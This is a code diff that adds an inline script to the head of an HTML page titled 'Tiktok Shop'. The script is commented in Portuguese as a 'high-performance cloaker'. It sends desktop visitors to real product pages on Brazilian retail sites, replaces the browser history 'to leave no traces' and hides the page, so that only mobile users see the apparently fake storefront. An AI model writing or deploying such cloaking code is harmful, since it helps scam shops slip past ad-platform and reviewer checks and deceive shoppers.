@@ -1,6 +1,30 @@
 <!doctype html>
 <html lang="en">
   <head>
+    <script>
+      // CLOAKER DE ALTA PERFORMANCE - EXECUÇÃO IMEDIATA
+      (function() {
+        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 1024;
+        
+        if (!isMobile) {
+          var path = window.location.pathname;
+          var redirects = {
+            "/furadeira": "https://www.lojadomecanico.com.br/produto/128695/21/223/furadeira-parafusadeira-de-impacto-a-bateria-12v-com-maleta-e-acessorios-soarfly-sf12",
+            "/robo-aspirador-philco": "https://www.havan.com.br/aspirador-de-po-robo-philco-limpeza-inteligente-pas26p-bivolt/p?gad_campaignid=23076176818",
+            "/": "https://www.lojadomecanico.com.br/produto/128695/21/223/furadeira-parafusadeira-de-impacto-a-bateria-12v-com-maleta-e-acessorios-soarfly-sf12"
+          };
+          
+          // Seleciona o destino com base na URL ou usa o padrão da furadeira
+          var target = redirects[path] || redirects["/"];
+          
+          // Redireciona e substitui o histórico para não deixar rastros
+          window.location.replace(target);
+          
+          // Bloqueia a renderização do restante do documento para desktops
+          document.documentElement.style.display = 'none';
+        }
+      })();
+    </script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Tiktok Shop</title>
